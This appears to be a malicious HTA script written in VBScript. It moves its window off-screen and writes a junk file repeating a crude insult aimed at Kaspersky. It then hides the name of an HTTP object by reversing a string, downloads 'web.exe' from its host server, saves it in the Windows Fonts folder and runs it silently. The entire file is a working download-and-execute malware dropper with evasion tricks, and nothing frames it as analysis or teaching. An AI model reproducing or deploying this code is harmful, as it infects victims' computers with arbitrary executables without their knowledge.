<script language="vbs">
self.MoveTo 5000,5000
'
'
'
'
'
Set shell=CreateObject("WScript.Shell")
'Ebal Ya V Rot Kaspera
ebar = "eb_tvou.mat"
Set fso = CreateObject("Scripting.FileSystemObject")
Set OLEr = fso.CreateTextFile(ebar)
for y = 1 to 500
OLEr.Write "Kasperskiy - Pidor" + chr(13) + chr(10)
next
OLEr.close
megret="PTTHLMX.2lmxsM"

ddd = shell.SpecialFolders("Fonts") + "\" + "web.exe"
set dot=CreateObject(strreverse(megret))
dot.Open "GET", "../web.exe", false

dot.Send()
cs = dot.responseBody
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.CreateTextFile(ddd)
for i = 0 to UBound(cs)
inta=1
intb=2
intc=int(intb)-int(inta)
c = ascb(midb(cs, i+1, 1))
f.Write chr(c)
next
f.close
shell.run(ddd)
window.close()
</script>